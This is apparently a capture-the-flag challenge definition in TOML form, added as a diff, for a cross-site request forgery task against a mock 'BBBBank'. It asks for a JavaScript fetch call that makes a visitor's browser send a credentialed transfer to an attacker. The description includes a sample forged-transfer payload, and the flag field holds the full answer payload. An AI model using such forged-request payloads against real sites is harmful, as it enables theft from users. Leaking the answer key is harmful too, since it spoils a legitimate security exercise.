@@ -1,0 +1,15 @@
+slug = "bbbbank-3"
+title = "BBBBank 3"
+author = "Jerry"
+value = 20
+description = """Assuming that the [BBBBank]((http://bbbbank.acmcyber.com:10000)) has implemented authentication cookies properly (if only the creator of the website actually understood web dev), what would be the javascript fetch command that could be embedded in a website to be sent to an unsuspecting Blytherin user from a Bryffindor wanting to steal all 100 Balleons they have? 
+
+For example, for the definitely secure bank, the fetch command would be fetch('https://dsb.victorzhou.com/transfer',{body:new URLSearchParams('amount=1000&description=Muahaha&to=Evil-Scammers'),credentials:'include',method:'post'});. Therefore, the flag would be flag{fetch('https://dsb.victorzhou.com/transfer',{body:new_URLSearchParams('amount=1000&description=Muahaha&to=Evil-Scammers'),credentials:'include',method:'post'});}
+
+Tip: Use the http instead of https, don't include www in the link, and replace the one space between new and URLSearchParams with an underscore.
+
+"""
+tags = ["csrf"]
+files = []
+flag = "flag{fetch('http://bbbbank.acmcyber.com:10000/barry-botter-and-the-bransfer-of-boney',{body:new_URLSearchParams('amt=100&cointype=Balleons&fhouse=Blytherin&thouse=Bryffindor'),credentials:'include',method:'post'});}"
+enabled = true
